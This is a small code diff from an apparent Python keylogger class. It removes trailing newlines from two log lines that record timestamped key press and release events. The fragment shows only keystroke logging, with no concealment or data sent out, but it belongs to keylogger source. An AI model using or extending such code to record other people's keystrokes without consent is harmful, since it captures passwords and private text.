@@ -69,12 +69,12 @@ class KeyLogger:
             self.stop_log()
         
         timestamp = self.get_timestamp()
-        self.logger.info(f'Keystroke pressed ({self.get_keystroke_rep(key)}) event at {timestamp} \n')
+        self.logger.info(f'Keystroke pressed ({self.get_keystroke_rep(key)}) event at {timestamp}')
 
     # Method to log the released keystroke
     def log_keystroke_released(self, key) -> None:
         timestamp = self.get_timestamp()
-        self.logger.info(f'Keystroke released ({self.get_keystroke_rep(key)}) event at {timestamp} \n')
+        self.logger.info(f'Keystroke released ({self.get_keystroke_rep(key)}) event at {timestamp}')
     
     # Method to start the logging
     def start_log(self) -> None:
